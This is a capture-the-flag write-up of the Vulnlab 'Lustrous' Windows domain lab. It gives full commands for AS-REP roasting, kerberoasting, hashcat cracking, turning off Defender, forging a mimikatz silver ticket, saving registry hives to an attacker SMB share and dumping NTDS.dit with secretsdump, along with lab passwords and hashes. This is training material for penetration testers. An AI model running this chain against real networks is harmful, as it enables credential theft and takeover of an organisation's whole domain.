
# Vulnlab - Lustrous

# NMAP

## LusDC.lustrous.vl

```bash
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
53/tcp    open  domain       Simple DNS Plus
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0  
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-08-18 17:17:52Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: lustrous.vl0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: TLS randomness does not represent time
| tls-alpn:            
|_  http/1.1                         
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=LusDC.lustrous.vl
| Subject Alternative Name: DNS:LusDC.lustrous.vl
| Issuer: commonName=LusDC.lustrous.vl
445/tcp   open  tcpwrapped
3269/tcp  open  tcpwrapped
3389/tcp  open  tcpwrapped
| ssl-cert: Subject: commonName=LusDC.lustrous.vl
49669/tcp open  tcpwrapped
58017/tcp open  msrpc        Microsoft Windows RPC
58052/tcp open  unknown
```
## LusMS.lustrous.vl

```bash
PORT     STATE SERVICE       REASON          VERSION
135/tcp  open  tcpwrapped    syn-ack ttl 127
139/tcp  open  tcpwrapped    syn-ack ttl 127
445/tcp  open  microsoft-ds? syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
|_ssl-date: 2023-08-18T16:57:21+00:00; -4s from scanner time.
| ssl-cert: Subject: commonName=LusMS.lustrous.vl
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49668/tcp open  unknown       syn-ack ttl 127
```

LusDC has webserver running, on accessing that it gives us access denied so it maybe accessible from the machine itself or from LusMS

<img src="https://i.imgur.com/GgK0FZY.png"/>

Checking for smb shares on `LusDC` and `LusMS`

<img src="https://i.imgur.com/uH53NTQ.png"/>

We didn't get any shares with null authentication, checking the ftp service with anonymous user on LusDC, there's a transfer folder there

<img src="https://i.imgur.com/qCe97un.png"/>
We get few user's directories

<img src="https://i.imgur.com/egJNyYK.png"/>

Out of these directories, there's only `ben.cox` who has `users.cvs` file, this file only had domain groups 

<img src="https://i.imgur.com/DHPc17b.png"/>

## Initital Foothold (ben.cox)

We have usernames so the only thing we could try here is to perform `AS-REP roasting` which doesn't require any password as `do not require preauthentication` check is marked on these accounts, so with `GetNPUsers.py`  we can verify if these users have that check

```bash
GetNPUsers.py lustrous.vl/ -usersfile users.txt  -dc-ip LusDC.lustrous.vl -request
```

<img src="https://i.imgur.com/UYiAuqH.png"/>
Having the hash, we can crack it with `hashcat`

```bash
hashcat -a 0 -m 18200 ./hash.txt /usr/share/wordlists/rockyou.txt  --force
```

<img src="https://i.imgur.com/Vyj3m7V.png"/>
Having the valid credentials we can check if there's any share `ben` can read but it doesn't show any interesting shares

<img src="https://i.imgur.com/wIlwnKt.png"/>

On to enumerating the domain with `python-bloodhound`

```bash
python3 /opt/BloodHound.py-Kerberos/bloodhound.py -d 'lustrous.vl' -u 'ben.cox' -p 'Trinity1' -c all -ns 10.10.152.149
```

<img src="https://i.imgur.com/BwXQPev.png"/>
From ben's groups, he's in `Remote Access` so maybe we can log into LusMS

<img src="https://i.imgur.com/SdNfrTx.png"/>

Running the `shortest path to high value targets` we have `tony.ward` who is part of `backup admins` so we'll have to reach to that user somehow and maybe abuse that group. 

<img src="https://i.imgur.com/fPqMs62.png"/>

To verify if we can have a shell on LusMS, running cme again on winrm

<img src="https://i.imgur.com/IfOYY8u.png"/>

```bash
evil-winrm -i 10.10.152.150 -u 'ben.cox' -p 'Trinity1'
```

<img src="https://i.imgur.com/DRw5rw0.png"/>

From ben's desktop folder we'll get `admin.xml` having the secure string password of local administrator

<img src="https://i.imgur.com/faews04.png"/>
Following this article to retrieve the plaintext password https://systemweakness.com/powershell-credentials-for-pentesters-securestring-pscredentials-787263abf9d8, we'll create two variables, `user` having the username and `pass` having the secure string password which will be piped to `ConvertTo-SecureString` , create `PSCredential` of the username and password and then with `GetNetworkCredential` we'll print out the credentials

```powershell
$user = "Administrator"
$pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000d4ecf9dfb12aed4eab72b909047c4e560000000002000000000003660000c000000010000000d5ad4244981a04676e2b522e24a5e8000000000004800000a00000001000000072cd97a471d9d6379c6d8563145c9c0e48000000f31b15696fdcdfdedc9d50e1f4b83dda7f36bde64dcfb8dfe8e6d4ec059cfc3cc87fa7d7898bf28cb02352514f31ed2fb44ec44b40ef196b143cfb28ac7eff5f85c131798cb77da914000000e43aa04d2437278439a9f7f4b812ad3776345367" | ConvertTo-SecureString
cred = New-Object System.Management.Automation.PSCredential($user, $pass)
$cred.GetNetworkCredential() | Format-List
```

<img src="https://i.imgur.com/HpJYA36.png"/>

With this password we can login as administrator

<img src="https://i.imgur.com/x1jY8V6.png"/>

Dumping credentials didn't gave us any new set of credential

<img src="https://i.imgur.com/QXSU6P5.png"/>

## Forging silver ticket to impersonate as tony.ward

Going back to bloodhound, we see two kerberoastable users, out of which `svc_web` might be useful for us as there's no mssql service running 

<img src="https://i.imgur.com/vvtLnJ6.png"/>

With `GetUsersSPNs.py` we can request the hash

```bash
GetUserSPNs.py Lustrous.vl/ben.cox:Trinity1 -dc-ip LusDC.lustrous.vl -request-user svc_web
```

<img src="https://i.imgur.com/ECIMVFw.png"/>

```bash
hashcat -a 0 -m 13100 svc_web.txt /usr/share/wordlists/rockyou.txt  --force
```

<img src="https://i.imgur.com/2COnAKe.png"/>
We saw a web page on LusDC, which we were not able to access, it maybe using kerberos authentication so with `getTGT.py` we can request the kerberos ticket of ben to see if we can access that page

```bash
 getTGT.py lustrous.vl/ben.cox:Trinity1 -dc-ip 10.10.222.197
```

<img src="https://i.imgur.com/a0ye4Kf.png"/>

Edit `/etc/krb5.conf` file as well

<img src="https://i.imgur.com/KooIhEo.png"/>

Now importing the ticket in `KRB5CCNAME` variable

<img src="https://i.imgur.com/KoBNz1K.png"/>

With curl we can access the page using kerberos authentication and from the output, it shows that it's some kind of notetaking application where there's a page `/Internal`

<img src="https://i.imgur.com/7ERcsT8.png"/>

<img src="https://i.imgur.com/HfonnZz.png"/>

Here it shows the password of ben and a note about activating kerberos authentication, we have the password of svc_web meaning that we can create a silver ticket to impersonate any user on the application and since we saw tony.ward is part of backup operators group we may need to move forward with that user, so impersonating as tony. Through `rpcclient` we can get sid of tony

<img src="https://i.imgur.com/S3u4zgD.png"/>

With `tickter.py` we can forge a silver ticket

<img src="https://i.imgur.com/G1d4u8W.png"/>

<img src="https://i.imgur.com/wDXtaTp.png"/>

But the site was not accessible with this ticket, I am not sure why it wasn't working so I moved on to windows machine to forge the ticket and try from there, to do that since defender is enabled we need to disable it in order to run mimikatz and we need to be `SYSTEM` user on LusMS to do this 

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

<img src="https://i.imgur.com/ElVfnsm.png"/>

```powershell
kerberos::golden /domain:lustrous.vl /sid:S-1-5-21-2355092754-1584501958-1513963426 /rc4:e67af8b3d78df5a02eb0d57b6cb60717 /user:tony.ward /target:LusDC.lustrous.vl /id:1114 /service:http/lusdc.lustrous.vl /ptt
```

<img src="https://i.imgur.com/TSTPs8j.png"/>
Running `klist` we'll see that the ticket is loaded into the memory

<img src="https://i.imgur.com/34HtOjz.png"/>
With `Invoke-WebRequest` we can can access the `Internal` endpoint showing the password for tony.ward

```powershell
Invoke-WebRequest -Uri http://lusdc.lustrous.vl/Internal -UseDefaultCredentials -UseBasicParsing | Select-Object -Expand Content
```

<img src="https://i.imgur.com/82aHerr.png"/>

## From Backup Operators To Domain Admin 

Since tony.ward is a member of backup operators, which has `SeBackup` and `SeRestore` privilege which can allow the group members to access any file so here we can take a backup of `ntds.dit`  but we can't get a remote shell with this user

<img src="https://i.imgur.com/1rdazpS.png"/>

However we can use the PoC https://raw.githubusercontent.com/Wh04m1001/Random/main/BackupOperators.cpp which is made by Filip Dragovic, just replace credentials and add the DC host

<img src="https://i.imgur.com/O51AT7q.png"/>
<img src="https://i.imgur.com/k8ZFNyU.png"/>

But to my surprise this didn't worked

<img src="https://i.imgur.com/9HYqhY7.png"/>

Using `reg.py` from impacket which is for querying remote registry, we can dump `SAM`, `SYSTEM` and `SECURITY` files from registry hive

```bash
reg.py lustrous.vl/tony.ward:U_cPVQqEI50i1X@10.10.233.213 save -keyName 'HKLM\SAM' -o '\\10.8.0.136\UWU'
reg.py lustrous.vl/tony.ward:U_cPVQqEI50i1X@10.10.233.213 save -keyName 'HKLM\SYSTEM' -o '\\10.8.0.136\UWU'
reg.py lustrous.vl/tony.ward:U_cPVQqEI50i1X@10.10.233.213 save -keyName 'HKLM\SECURITY' -o '\\10.8.0.136\UWU'
```

<img src="https://i.imgur.com/52jB75F.png"/>
<img src="https://i.imgur.com/IqBYo8d.png"/>

With `secretsdump.py` , we can parse SAM file locally

```bash
secretsdump.py -sam ./SAM.save -system ./SYSTEM.save -security ./SECURITY.save local
```

<img src="https://i.imgur.com/H1zwEqp.png"/>
The administrator hash we get is for DSRM as DC uses NTDS.dit file for the password hashes so we cannot use this hash  as DSRM needs to be enabled, so using the machine account (LusDC) with the hash `a34bee37b205abb8908277c4751d79ea`  we can dump the `NTDS.dit` file 

```bash
secretsdump.py 'LusDC$'@10.10.233.213 -hashes ':a34bee37b205abb8908277c4751d79ea'
```

<img src="https://i.imgur.com/yepcFK8.png"/>

<img src="https://i.imgur.com/oRzttls.png"/>

# References

- https://systemweakness.com/powershell-credentials-for-pentesters-securestring-pscredentials-787263abf9d8
- https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver
- https://raw.githubusercontent.com/Wh04m1001/Random/main/BackupOperators.cpp 
- https://www.youtube.com/watch?v=wUy2VXL2y-w&ab_channel=0xdeaddood

